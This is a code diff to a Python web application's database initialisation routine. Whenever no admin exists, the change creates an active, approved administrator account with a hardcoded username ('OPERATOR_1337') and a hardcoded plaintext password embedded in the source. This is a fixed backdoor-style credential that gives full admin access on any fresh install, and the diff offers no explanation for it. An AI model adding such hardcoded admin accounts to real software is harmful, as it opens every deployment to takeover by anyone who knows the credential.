@@ -120,7 +120,32 @@ def init_db():
             admin_exists = cursor.fetchone()[0] > 0
             
             if not admin_exists:
-                app.logger.warning("No admin account detected")
+                app.logger.warning("No admin account detected, creating default admin...")
+                # Create default admin user
+                cursor.execute('''
+                    INSERT INTO users (
+                        username,
+                        password_hash,
+                        email,
+                        is_admin,
+                        is_approved,
+                        status,
+                        created_at,
+                        updated_at
+                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+                ''', (
+                    'OPERATOR_1337',
+                    generate_password_hash('ITgwXqkIl2co6RsgAvBhvQ'),
+                    'admin@example.com',
+                    True,
+                    True,
+                    'active',
+                    datetime.now(),
+                    datetime.now()
+                ))
+                conn.commit()
+                app.logger.info("Default admin user created")
+            
     except Exception as e:
         app.logger.error(f"Database initialization error: {str(e)}")
         raise
